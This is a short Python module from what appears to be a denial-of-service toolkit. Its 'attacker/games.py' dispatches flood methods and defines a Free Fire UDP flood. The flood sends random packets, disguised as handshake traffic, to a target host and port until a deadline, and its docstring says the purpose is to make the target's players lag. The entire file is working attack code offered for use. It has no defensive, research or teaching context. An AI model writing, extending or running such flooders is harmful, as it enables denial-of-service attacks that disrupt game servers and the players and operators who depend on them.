# attacker/games.py — game-server specific methods
import asyncio, socket, struct, random, time, os

async def run(method, target, port, until):
    from attacker import l4
    fn = l4.METHODS.get(method.upper())
    if not fn:
        raise ValueError(f"unknown game method: {method}")
    await asyncio.get_event_loop().run_in_executor(None, lambda: fn(target, port, until))

async def freefire_flood(target, port, until):
    """Free Fire — Garena UDP flood, causes 'net 99' (ping icon) on target players."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)

    # Garena uses UDP on ports 10000-12000 range typically; target port given.
    # Construct minimal-looking UDP payloads in the Free Fire range.
    def payload():
        # Free Fire handshake-like packets
        t = random.choice([0x0A, 0x0B, 0x0C, 0x0D, 0x1F, 0x20])
        return bytes([t]) + os.urandom(random.randint(64, 512))

    while time.time() < until:
        try:
            s.sendto(payload(), (target, port))
        except OSError:
            pass
    s.close()